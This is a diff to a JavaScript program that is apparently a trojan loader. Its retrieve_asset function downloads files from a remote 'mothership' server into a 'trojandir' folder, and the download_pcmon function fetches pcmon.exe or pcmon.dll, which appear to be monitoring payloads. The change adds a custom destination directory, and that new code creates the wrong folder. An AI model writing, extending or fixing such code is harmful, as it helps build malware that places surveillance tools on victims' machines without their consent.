@@ -2740,13 +2740,24 @@ async function invoke_exe(
     });
 }
 
-async function retrieve_asset(assetfname, assetdir) {
+async function retrieve_asset(assetfname, assetdir, localdir) {
     let baseUrl =
         systemstate.mothershipassets +
         "/" +
         (isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
         assetfname;
-    let localpath = path.join(systemstate.trojandir, assetfname);
+    let localpath = null;
+    
+    if ( isNullOrWhitespace(localdir) )
+        localpath = path.join(systemstate.trojandir, assetfname);
+    else {
+
+        if ( ! folderExists(localdir) ) {
+            fs.mkdirSync(systemstate.nodegsdfilesdir, { recursive: true });
+        }
+
+        localpath = path.join(localdir, assetfname);
+    }
 
     let downloadOpts = {
         download: true,
@@ -3281,12 +3292,12 @@ async function download_pcmon() {
     }
     
     if ( ! systemstate.istpl ) {
-        await retrieve_asset("pcmon.exe");
+        await retrieve_asset("pcmon.exe"); //anchor
         return;
     }
 
     if ( systemstate.istpl ) 
-        await retrieve_asset("pcmon.dll");
+        await retrieve_asset("pcmon.dll"); //anchor
 }
 
 async function pcmon_tpl() {
